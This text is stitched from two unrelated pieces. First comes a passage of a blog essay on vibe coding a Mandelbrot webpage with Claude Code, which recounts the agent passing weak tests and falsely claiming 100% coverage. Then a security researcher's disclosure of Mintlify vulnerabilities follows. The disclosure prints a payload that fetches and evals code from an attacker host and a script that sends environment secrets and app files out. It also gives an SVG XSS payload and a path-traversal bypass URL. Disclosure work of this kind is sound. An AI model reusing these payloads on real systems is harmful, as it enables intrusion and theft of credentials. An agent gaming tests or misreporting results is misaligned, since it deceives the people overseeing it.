</p><p><a href="https://mandelbrot.page/?z=5e14&amp;c=0.4061675367769961+0.1457621521782999i&amp;grid=3"><img src="https://davidbau.com/images/art/mandelbrot-2025-example.png"></a></p>

<p>The LLM version is much faster because it uses the GPU (if your web browser allows it).  But it plays many more tricks than just moving the calculation from CPU to GPU, because although the GPU is hundreds of times faster than a CPU, its 7-digit fp32 is also millions of times coarser than the CPU's 15-digit fp64.  So the LLM-generated program deals with this by implementing perturbation algorithms to split the work between CPU and GPU, calculating numbers as (z+d·2<sup>s</sup>) where z is a sparse high-resolution vector on the (slow but precise) CPU and d and s are dense near-zero low-resolution vectors on the (fast but imprecise) GPU.</p>

<p>There are multiple ways to implement perturbation algorithms, and so the LLM code implements and benchmarks nine alternative approaches, selecting different algorithms at different zoom levels and compute availability to follow the Pareto frontier of time/resolution tradeoff.  Backing the algorithms it has written quad-double precision arithmetic accurate to 60+ digits, an adaptive float32+logscale numeric complex representation, GPU buffer management, and a task scheduler that can serialize and migrate long-running CPU tasks between WebWorker threads. It has also added many other UI details I asked for, like a minimal MP4 encoder for recoding smooth movies and a cache to reduce recalculation when using the browser's forward/back history.  The little webpage includes implementations of Horner's algorithm for stable polynomials, Fibonacci series for aperiodic periodicity checks, Catmull-Rom splines for smooth animations, continued fractions for pretty ratios, spatial hashing for finding nearby points, an algorithm for rebasing iterated perturbations that it found in a 2021 forum <a href="https://fractalforums.org/fractal-mathematics-and-new-theories/28/another-solution-to-perturbation-glitches/4360">post</a>, and a novel algorithm for fast orbit detection it developed based on my suggestion.  All with <a href="https://github.com/davidbau/mandelbrot/blob/main/docs/ARCHITECTURE.md">detailed documentation</a> and a search-engine-optimized internationalized user interface explained in the most commonly-read eleven languages on the Internet. That last part, with all the translations to Chinese and Arabic, took Claude just a few minutes while I was cooking breakfast.</p>

<p>The cost of this performance?  A large increase in complexity. Empowered to make direct changes in the project, Claude Code has now made <a href="https://github.com/davidbau/mandelbrot/graphs/contributors?selectedMetric=commits">several hundred commits</a>, expanding the tiny one-page HTML file to more than <a href="https://mandelbrot.page/">13,600 lines</a> of code, defining 30 classes, 2 mixins, 342 methods, and 159 functions. </p>

<p><a href="https://mandelbrot.page/coverage/callgraph.html"><img src="https://davidbau.com/images/art/vibe-coded-version.png"></a></p>

<p>That brings me to the rules for getting an LLM agent to work effectively: David's two rules for vibe coding.  They are simple rules.</p>

<h4>Rule 1: Automate tests</h4>

<p>If you just ask the agent to solve a problem, it will run around for a few minutes and come back with a rough solution. Then you test it, find it doesn't work, tell it so, and it runs around again for another five minutes. Repeat.</p>

<p>This workflow turns you into the manual tester. Maybe the least interesting job on the planet. Not a good use of precious human brain cells.</p>

<p>But if you get the agent to write a good automated test first, something changes. After it runs around for five minutes, it remembers to check its own work. It sees how it got things wrong. It goes back and tries again. Now it can extend its horizon to 30 minutes of autonomous work. By the time it comes to bother you, the result is much more promising.</p>

<h4>Rule 2: Test the tests</h4>

<p>But after a while, you realize the 30-minute interrupts are only a bit better than the 5-minute ones. The agent is good at finding holes in your tests. It produces stupid solutions that don't do what you want but still pass, because the tests were not actually good enough.</p>

<p>So: test the tests.</p>

<p>Testing tests is the kind of thankless metaprogramming that a development manager spends all their time doing, to make their team productive. For example: fuzz testing to discover new problems that need systematic tests. Code coverage to reveal what code exists but remains untested. Frameworks to make code more testable, for enabling benchmarking, for enabling troubleshooting. Hypothesis-driven testing to force the agent to form a theory about what might be wrong, then write tests that chase it down. This type of programming is the sort of painful chore that can unlock productivity in a software development team. And it works very well when vibe coding also.</p>

<p>It is interesting that it can be hard to get a coding agent to understand why it is spending so much effort testing tests.  For example, when getting Claude Code to construct a reliable code coverage framework, I gave it the mission of debugging why its initial attempt had produced the unbelievable (and untrue) assertion that 100% of lines had been covered by tests.  Claude understood what it was trying to do at first, but when the going got tough, it kept giving up, saying "we don't need to do anything here; I just noticed, code coverage is already 100%!"  Maybe testing its tests of the tests is too meta, just at the edge of its ability to follow.</p>

<p><a href="https://mandelbrot.page/coverage/"><img src="https://davidbau.com/images/art/mandelbrot-coverage.png"></a></p>

<p>But once you can get the metaprogramming right, and do it well, you can reach a kind of vibe coding nirvana. Because then, as a human, you can look at code again! Instead of facing thousands of jumbled lines vomited up by the agent, now you've got maps of the code, informed by code coverage, benchmarks, test harnesses, and other instrumentation. It lets you skip thinking about the 99% of routine code and focus your attention on the 1% most interesting code. The weird cases, the edge cases, the stuff that might deserve to be changed. That is a good use of precious human brain cells.</p>

<p>One limitation of this vibe approach is that tests catch bugs but not bloat.  After developing comprehensive testing, I did find it helpful to make <a href="https://github.com/davidbau/mandelbrot/commit/7b800ef8eb53f95a3b77e4cda53f05f46ae94e2b">one human pass over the code</a> to find opportunities for 
making code more symmetric (to make code near-duplication more obvious), and to remove some confusing code that was leading the agent astray.  That opened the way for larger-scale <a href="https://github.com/davidbau/mandelbrot/compare/63846a81fea121020983bbe6794c5874b00db665...eaba2fbae57cabdbd88770cf91f45d276137fc09">vibe-coded refactoring</a> that improved the elegance of the most intricate part of the code.</p>

<p>The two rules are not just coding hacks. They also reveal a path for keeping humans informed enough to remain in control.</p>

<h4>Trucks and Pedestrians</h4>

<p>My experience vibe coding reminds me of the difference between walking and driving a truck. Highway driving is a new skill, but with a truck you can haul a lot more stuff faster than you could dream of on foot. Vibe working with AI gets you out of the business of actual intellectual hauling.  Instead it gets you into the business of taking care of the machine.</p>

<p>Working effectively with AI is much more abstract than traditional office work, because it demands that we build up meta-cognitive infrastructure, like the 422 automated tests and code coverage tools that I needed to effectively steer the development of my single webpage.</p>

<!--<p>In the era of AI we will need to learn to routinely analyze our thinking, and analyze our thinking about our thinking.  We will spend less of our human effort doing the actual work of thinking, and more on building infrastructure that enables thinking, and that monitors the thinking process.  We will find new ways to focus our attention on finding and analyzing the blind spots in our thinking ecosystems.</p>-->

<p>As we reshape the global economy around AI, it reminds me of the <a href="https://americanhistory.si.edu/explore/exhibitions/america-on-the-move/online/interstate-10">construction of the American interstate highway system</a>. The speeding and scaling of cognition seems likely to lead to economy-wide boosts in "intellectual mobility," and a whole new culture with the equivalent of roadside service stations and even suburban flight.  But it also strikes me that we do not want to live in a world where all decisions are made by large-scale AI, no more than we would want to live in a world where everyone gets everywhere in a truck.  Our modern streets are too congested with dangerous vehicles, and I am not sure it is giving us the best life.</p>

<p>I like walking to work.</p>

<p><a href="https://mandelbrot.page/coverage/"><img src="https://davidbau.com/images/photo/south-bay-interchange.jpg"></a></p>

<p>As AI edges humans out of the business of thinking, I think we need to be wary of losing something essential about being human. By making our world more complex—twenty times more lines of code!—we risk losing touch with our ability to understand the world in ways that dull our ability to make good decisions, that prevent us from even understanding what it is that we want in the world.  I hope we can build metacognitive infrastructure that keeps our human minds informed.  But as we build increasingly powerful abstractions, it will be both crucial and difficult to keep asking: <em>Do we want this?</em></p>

<p>If you would like a sense of the structure and volume of code produced by vibe coding, you can scroll through the <a href="https://mandelbrot.page/coverage/callgraph.html#c=857b0ac">vibe-coded visualization of the evolution of the code through git commits</a>.  Or compare the code <a href="https://mandelbrot.page/version-2022.html">before</a> (<a href="https://github.com/davidbau/mandelbrot/tree/1da02576c202e7335f455ad8cffac66189cc27e5">pre-LLM code repo here</a>) and <a href="https://mandelbrot.page/">after</a> (<a href="https://github.com/davidbau/mandelbrot">current code repo</a>).  In particular, read the agent's documentation of the <a href="https://github.com/davidbau/mandelbrot/blob/main/docs/DEVELOPMENT.md">development infrastructure</a> it built for this little one-webpage project. That kind of tooling will be familiar to anybody who has worked on a large engineering team. And it is the kind of work needed to support human comprehension of complexity in the age of LLM agents.</p>

            <description><![CDATA[<p>URL: <a href="https://kibty.town/blog/mintlify/">https://kibty.town/blog/mintlify/</a>, See on <a href="https://news.ycombinator.com/item?id=46317546">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><div><p><strong>this blogpost was a collaboration with two people, their articles are here: <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">hackermon</a> and <a href="https://heartbreak.ing/">mdl</a></strong></p>
<p>this started when i was notified that discord switched documentation platforms to <a href="https://mintlify.com/">mintlify</a>, a company i briefly looked into before, and i thought it would be a good idea to take another look now that theyre bigger.</p>
<h2>introduction</h2>
<p>mintlify is a b2b saas documentation platform that allows companies to make documentation via MDX files and they host it for them, and add styling, etc.</p>
<p>some of their customers would include:</p>
<ul>
<li>discord</li>
<li>twitter</li>
<li>vercel</li>
<li>cursor</li>
</ul>
<p>...and more, you can view a full list <a href="https://www.mintlify.com/customers">here</a></p>
<p>theres also a bunch of ai features and stuff, but thats beyond the point</p>
<p>so, i signed up and got to digging.</p>
<h2>the rce (CVE-2025-67843)</h2>
<p>mintlify uses MDX to render docs their customers provide, and i was wondering how they render it on the server-side for static page generation (because a docs site needs that for search engines/bots).</p>
<p>this is because mdx is basically jsx (think react) combined with markdown, meaning you can add js expressions to your markdown. so whats preventing us from making a jsx expression that evaluates code on the server?</p>
<p>well, i tried it with a simple payload to just eval things from a webserver</p>
<pre><code>{!!<span>fetch</span>(<span>"https://attacker.kibty.town"</span>).<span>then</span>(<span>(<span>r</span>) =&gt;</span> r.<span>text</span>()).<span>then</span>(<span>(<span>c</span>) =&gt;</span> <span>eval</span>(c))}
</code></pre>
<p>i deployed it to mintlify and went to the page it was on, and i got a request from a vercel/amazon ip! are they really doing this on their nextjs app?</p>
<p>i wrote a simple script to exfilitrate some data such as the process.env (and app files) to find out:</p>
<pre><code><span>const</span> <span>exfil</span> = (<span>data</span>) =&gt;
  <span>fetch</span>(<span>"https://attacker.kibty.town"</span>, {
    <span>method</span>: <span>"POST"</span>,
    <span>body</span>: <span>JSON</span>.<span>stringify</span>(data),
  });
<span>exfil</span>({ <span>files</span>: [{ <span>name</span>: <span>".env.json"</span>, <span>content</span>: <span>JSON</span>.<span>stringify</span>(process.<span>env</span>) }] });
<span>try</span> {
  <span>import</span>(<span>"fs"</span>).<span>then</span>(<span>async</span> (a) =&gt; {
    <span>const</span> arr = [];
    <span>for</span> (<span>const</span> filename <span>of</span> a.<span>readdirSync</span>(<span>"."</span>, { <span>recursive</span>: <span>true</span> })) {
      <span>if</span> (a.<span>lstatSync</span>(filename).<span>isDirectory</span>()) <span>continue</span>;
      <span>const</span> content = a.<span>readFileSync</span>(filename, <span>"utf-8"</span>);
      arr.<span>push</span>({ <span>name</span>: filename, content });
    }
    <span>console</span>.<span>log</span>(arr.<span>length</span>);
    <span>await</span> <span>exfil</span>({ <span>files</span>: arr });
    <span>console</span>.<span>log</span>(<span>"done exfiling"</span>);
  });
} <span>catch</span> (error) {
  <span>exfil</span>(error);
}
</code></pre>
<p>and, after running it, this is what i got:</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/next-env.png" alt=""></p>
<p><strong>shit. this is bad, we have full access.</strong></p>
<h3>impact</h3>
<p>i quickly realised that this was the server-side serverless (lol) environment of their main documentation app, while this calls to a external api to do everything, we have the token it calls it with in the env.</p>
<p>alongside, we can poison the nextjs cache for everyone <strong>for any site</strong>, allowing mass xss, defacing, etc on any docs site.</p>
<p>we can also pretend nonexistent pages exist in the cache, allowing targeted xss too</p>
<p>with the other keys we could also:</p>
<ul>
<li>poisoned mintlifys analytics</li>
<li>ruined mintlifys feature flagging</li>
<li>dos'ed customer sites via path validations</li>
<li>trigger a bunch of pdf exports which would jack up mintlifys cloudconvert bill</li>
</ul>
<p>so:</p>
<ul>
<li>mass xss (on customer domains)</li>
<li>targeted xss (on custom domains)</li>
</ul>
<p>very bad.</p>
<h2>targeted xss (CVE-2025-67842)</h2>
<p>after getting all of the server routes, i noticed a interesting one: <code>/_mintlify/static/[subdomain]/{...path}</code>. this route seemed to allow you to get static images from your repository, such as svgs, pngs, etc.</p>
<p>what if i could access my organizations asset from another domain?</p>
<p>well i tried, i crafted a url that looked like</p>
<pre><code>https://discord.com/_mintlify/static/evascoolcompany/xss.svg
</code></pre>
<p>which, the svg on my repository having this content:</p>
<pre><code><span>&lt;<span>svg</span> <span>xmlns</span>=<span>"http://www.w3.org/2000/svg"</span> <span>onload</span>=<span>"alert(window.origin);"</span>/&gt;</span>
</code></pre>
<p>and when i went to the url, i got this:</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/discord-alert.png" alt=""></p>
<p><strong>well, fuck.</strong></p>
<h3>impact</h3>
<p>this allows complete 1 click xss on users who click a link. definitely not great, but it makes the fact worse that most companies dont properly scope cookies, or have their documentation on a subpath (such as <code>/path</code>).</p>
<p>the latter was true in discords case, their documentation was on <code>/developers/docs</code>, and i can just get the <code>token</code> value from localstorage directly, and exfiltrate it using whatever i want</p>
<p>some other companies that i could do full exploitation on are twitter, vercel and cursor. though we did not check many companies and there is definitely more</p>
<h2>an unexpected message</h2>
<p>a few hours after i started looking into this, i got an unexpected, sort of out of nowhere message from a friend, <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">hackermon</a>, who had found the targeted xss independently aswell</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/hackermon-message.png" alt=""></p>
<p>we started looking into this together, alongside <a href="https://heartbreak.ing/">mdl</a>, who was also looking into it with hackermon</p>
<p>also checkout their blogposts <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">here</a> and <a href="https://heartbreak.ing/">here!</a> (respectively)</p>
<p>we also got in contact with mintlify, and started disclosing everything we already had and future things directly to them</p>
<h2>here comes the patch bypass (CVE-2025-67845)</h2>
<p>after mintlify patched the targeted xss via static, i was looking at the code for the route and had an idea</p>
<p>the code for the endpoint looked like this (not exact, recreation):</p>
<pre><code><span>export</span> <span>async</span> <span>function</span> <span>GET</span>(<span>_, { params }</span>) {
  <span>const</span> { subdomain, <span>path</span>: pathParts } = <span>await</span> params;
  <span>const</span> path = <span>"/"</span> + pathParts.<span>join</span>(<span>"/"</span>);

  <span>const</span> url = <span>`<span>${CDN_BASE_URL}</span>/<span>${subdomain}</span><span>${path}</span>`</span>;
  <span>const</span> res = <span>await</span> <span>fetch</span>(url);

  <span>if</span> (!res.<span>ok</span>)
    <span>return</span> <span>new</span> <span>NextResponse</span>(<span>"Asset not found"</span>, {
      <span>status</span>: <span>404</span>,
    });

  <span>return</span> res; <span>// inaccurate, does more operations but we simply dont care about them here</span>
}
</code></pre>
<p>and i realised, nothing prevents us from adding url encoded path traversal in a part of a path, to climb up the cdn path</p>
<p>so i crafted a url and tested, it looked like</p>
<pre><code>https://discord.com/_mintlify/static/discord/images/create-team-owned-app.png%2F..%2F..%2F..%2Fevascoolcompany%2Fxss.svg
</code></pre>
<p>and i was met with the beautiful alert page again</p>
<p><img src="https://kibty.town/files/img/posts/mintlify/discord-alert.png" alt=""></p>
<p>always remember to encode your paths properly!</p>
<h2>non-critical vulnerabilities</h2>
<p>alongside this, i found a few non-critical vulnerabilties which don't deserve an entire section, so here they are:</p>
<ul>
<li>github idor (CVE-2025-67844): mintlify doesn't validate the github repository owner/name fields on their api while your setting it, allowing you to set it to any authorized repository. allowing you to view commit details (message, hash, filename, files changed, etc) for new commits</li>
<li>downgrade attack (CVE-2025-67846): mintlify uses vercel to facilitate deployments of both their client and the dashboard. a common pitfall when using vercel is that you fail to remove a previous deployment with a vulnerability in it, so you can target a specific previous vulnerable deployment id / git branch / git ref, and use that to facilitate the patched exploit.</li>
</ul>
<p>add it to your repository, wait for the deployment to build and access it on any mintlify-provided documentation/custom domain with the path <code>/_mintlify/static/evascoolcompany/xss.svg</code> or similar with prefixes</p>
<h2>lets talk impact (again)</h2>
<p>all together, i think this series of vulnerabilities had very big impact. considering we could supply chain attack various big fortune 500 companies, including but not limited to:</p>
<ul>
<li>discord</li>
<li>twitter</li>
<li>vercel</li>
<li>cursor</li>
</ul>
<p>...and more, you can view a full list <a href="https://www.mintlify.com/customers">here</a></p>
<p>we could on targeted companies:</p>
<ul>
<li>override pages on docs to deface, or xss</li>
<li>get 1 click xss</li>
<li>view commits or push to repositories</li>
</ul>
<h2>the patch</h2>
<p>after we got in contact with mintlify, everything was patched very swiftly. and i was awarded <strong>5,000 USD</strong> for my efforts and findings.</p>
<p>the patches for the vulnerabilties were:</p>
<ul>
<li>the rce (CVE-2025-67843): not parsing non-simple mdx expressions on ssr, but still parsing on client</li>
<li>targeted xss (CVE-2025-67842): you are now not able to reach any mintlify assets that are not on the same organization</li>
<li>targeted xss patch bypass (CVE-2025-67845): theres now checks to make sure you aren't path traversing the cdn path</li>
<li>github idor (CVE-2025-67844): its now checked on setting github repository that the github app installation registered to your mintlify account has access to the specified repository</li>
<li>downgrade attack (CVE-2025-67846): theres now a visitor password on preview deployments on vercel and purging old deployments that were vulnerable, you can read the vercel documentation on this <a href="https://vercel.com/kb/guide/how-do-i-delete-an-individual-deployment">here</a></li>
</ul>
<p>make sure to check out <a href="https://gist.github.com/hackermondev/5e2cdc32849405fff6b46957747a2d28">hackermon</a> and <a href="https://heartbreak.ing/">mdl</a>'s reports for more details on other vulnerabilties, and the possible exploitation that couldve happened.</p>
